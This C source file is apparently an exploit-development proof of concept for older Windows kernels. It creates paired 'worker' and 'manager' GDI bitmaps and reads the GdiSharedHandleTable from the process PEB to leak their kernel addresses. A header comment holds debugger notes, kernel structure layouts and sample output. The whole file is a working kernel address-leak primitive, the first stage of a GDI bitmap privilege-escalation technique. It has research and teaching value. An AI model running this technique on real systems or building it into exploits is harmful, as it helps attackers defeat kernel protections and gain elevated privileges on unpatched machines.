/*cl bitmap_leak_pre_anniversary.c /I . */
/*
[+] PEB base address : 00007FF6B6F8F000
[+] PEB GdiSharedHandleTable address : 0000001124EC0000
[+] worker_kernel_offset : 1124ecc000
[+] manager_kernel_offset : 1124ecd230
[+] Worker Bitmap Handle : 000000002E050800
[+] Worker Bitmap pKernelAddress : fffff90143e36000
[+] Manager Bitmap Handle : 00000000080508C2
[+] Manager Bitmap pKernelAddress : fffff90143e3e000

kd>.process / i ffffe000a207a080
kd> g
kd> !peb
PEB at 00007ff6b6f8f000

kd> dt nt!_PEB 00007ff6b6f8f000
+ 0x0f8 GdiSharedHandleTable : 0x00000011`24ec0000 Void

typedef struct {
	PVOID64 pKernelAddress; // 0x00
	USHORT wProcessId; // 0x08
	USHORT wCount; // 0x0a
	USHORT wUpper; // 0x0c
	USHORT wType; // 0x0e
	PVOID64 pUserAddress; // 0x10
} GDICELL64; // sizeof = 0x18

kd> dq 1124ecc000 L3
00000011`24ecc000  fffff901`43e36000 40052e05`00001060
00000011`24ecc010  00000000`00000000

typedef struct {
	ULONG64 hHmgr;
	ULONG32 ulShareCount;
	WORD cExclusiveLock;
	WORD BaseFlags;
	ULONG64 Tid;
} BASEOBJECT64; // sizeof = 0x18

kd> dt win32k!_BASEOBJECT fffff901`43e36000
+ 0x000 hHmgr            : 0x00000000`2e050800 Void
+ 0x008 ulShareCount     : 0
+ 0x00c cExclusiveLock : 0
+ 0x00e BaseFlags : 0
+ 0x010 Tid : (null)

typedef struct {
	ULONG64 dhsurf; // 0x00
	ULONG64 hsurf; // 0x08 (OUR HANDLE)
	ULONG64 dhpdev; // 0x10
	ULONG64 hdev; // 0x18
	SIZEL sizlBitmap; // 0x20
	ULONG64 cjBits; // 0x28
	ULONG64 pvBits; // 0x30
	ULONG64 pvScan0; // 0x38
	ULONG32 lDelta; // 0x40
	ULONG32 iUniq; // 0x44
	ULONG32 iBitmapFormat; // 0x48
	USHORT iType; // 0x4C
	USHORT fjBitmap; // 0x4E
} SURFOBJ64; // sizeof = 0x50

kd> dq fffff901`43e36000 + 0x18 + 0x8 L1
fffff901`43e36020  00000000`2e050800 (hsurf)

kd> dq fffff901`43e36000 + 0x18 + 0x38 L1
fffff901`43e36050  fffff901`43e36258 (pvScan0)

*/

#include "pch.h"
#include <stdio.h>
#include <windows.h>
#include "structures.h"

#pragma comment(lib, "gdi32.lib")

// Define global variables
HMODULE ntdll;

// Define required structures
struct bitmap_structure {
	HBITMAP worker_bitmap;
	HBITMAP manager_bitmap;
};

typedef NTSTATUS(__stdcall *_NtQueryInformationProcess)(
	HANDLE ProcessHandle,
	PROCESSINFOCLASS ProcessInformationClass,
	PVOID ProcessInformation,
	ULONG ProcessInformationLength,
	PULONG ReturnLength
	);

struct bitmap_structure create_bitmaps() {

	// Define variables for BitMap creation
	struct bitmap_structure bitmaps;
	char *worker_bitmap_memory;
	char *manager_bitmap_memory;
	HBITMAP worker_bitmap;
	HBITMAP manager_bitmap;
	int nWidth = 364;
	int nHeight = 212;
	unsigned int cPlanes = 1;
	unsigned int cBitsPerPel = 1;
	const void *worker_lpvBits;
	const void *manager_lpvBits;

	// Allocating memory for lvpBits
	worker_bitmap_memory = (char *)malloc(nWidth * nHeight);
	memset(worker_bitmap_memory, 0x00, sizeof(worker_bitmap_memory));
	worker_lpvBits = worker_bitmap_memory;

	manager_bitmap_memory = (char *)malloc(nWidth * nHeight);
	memset(manager_bitmap_memory, 0x00, sizeof(manager_bitmap_memory));
	manager_lpvBits = manager_bitmap_memory;

	// Creating the BitMaps
	worker_bitmap = CreateBitmap(nWidth, nHeight, cPlanes, cBitsPerPel, worker_lpvBits);
	if (worker_bitmap == NULL) {
		printf("[!] Failed to create BitMap object: %d\n", GetLastError());
		exit(1);
	}

	manager_bitmap = CreateBitmap(nWidth, nHeight, cPlanes, cBitsPerPel, manager_lpvBits);
	if (manager_bitmap == NULL) {
		printf("[!] Failed to create BitMap object: %d\n", GetLastError());
		exit(1);
	}

	bitmaps.worker_bitmap = worker_bitmap;
	bitmaps.manager_bitmap = manager_bitmap;
	return bitmaps;
}

PROCESS_BASIC_INFORMATION leak_bitmaps() {

	NTSTATUS NtStatus;
	_NtQueryInformationProcess NtQueryInformationProcess;

	NtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");
	if (NtQueryInformationProcess == NULL) {
		printf("[!] Error while resolving NtQueryInformationProcess: %d\n", GetLastError());
	}

	PROCESS_BASIC_INFORMATION ProcessInformation;
	ULONG ProcessInformationLength = sizeof(PROCESS_BASIC_INFORMATION);
	PULONG ReturnLength = 0;

	NtStatus = NtQueryInformationProcess(GetCurrentProcess(), ProcessBasicInformation, &ProcessInformation, ProcessInformationLength, ReturnLength);
	if (NtStatus != STATUS_SUCCESS) {
		printf("[!] Requesting info through NtQueryInformationProcess failed: %x\n", NtStatus);
		exit(1);
	}

	return ProcessInformation;
}

int main() {

	// Get NTDLL module
	ntdll = LoadLibraryA("ntdll");
	if (ntdll == NULL) {
		printf("[!] Error while loading ntdll: %d\n", GetLastError());
		return 1;
	}

	// Create Worker & Manager Bitmaps
	struct bitmap_structure bitmaps;
	bitmaps = create_bitmaps();

	// Get PEB address
	PROCESS_BASIC_INFORMATION ProcessInformation;
	ProcessInformation = leak_bitmaps();
	PPEB peb_base = ProcessInformation.PebBaseAddress;
	printf("[+] PEB base address: %p\n", ProcessInformation.PebBaseAddress);
	printf("[+] PEB GdiSharedHandleTable address: %p\n", peb_base->GdiSharedHandleTable);

	ULONGLONG worker_kernel_offset = (ULONGLONG)peb_base->GdiSharedHandleTable + ((ULONGLONG)bitmaps.worker_bitmap & 0xffff) * sizeof(GDICELL64);
	ULONGLONG manager_kernel_offset = (ULONGLONG)peb_base->GdiSharedHandleTable + ((ULONGLONG)bitmaps.manager_bitmap & 0xffff) * sizeof(GDICELL64);

	BOOL rpm;
	ULONGLONG worker_kernel_address;
	ULONGLONG manager_kernel_address;

	printf(
		"[+] worker_kernel_offset: %I64x\n"
		"[+] manager_kernel_offset: %I64x\n",
		(ULONGLONG)worker_kernel_offset,
		(ULONGLONG)manager_kernel_offset
	);

	rpm = ReadProcessMemory(GetCurrentProcess(), (LPVOID)worker_kernel_offset, &worker_kernel_address, sizeof(ULONGLONG), NULL);
	if (rpm == 0) {
		printf("[!] Error while reading the worker kernel address: %d\n", GetLastError());
		return 1;
	}

	rpm = ReadProcessMemory(GetCurrentProcess(), (LPVOID)manager_kernel_offset, &manager_kernel_address, sizeof(ULONGLONG), NULL);
	if (rpm == 0) {
		printf("[!] Error while reading the manager kernel address: %d\n", GetLastError());
		return 1;
	}

	printf(
		"[+] Worker Bitmap Handle: %p\n"
		"[+] Worker Bitmap pKernelAddress: %I64x\n"
		"[+] Manager Bitmap Handle: %p\n"
		"[+] Manager Bitmap pKernelAddress: %I64x\n",
		(PVOID)bitmaps.worker_bitmap,
		(ULONGLONG)worker_kernel_address,
		(PVOID)bitmaps.manager_bitmap,
		(ULONGLONG)manager_kernel_address
	);

	// Debugging stuff
	getchar();

	return 0;
}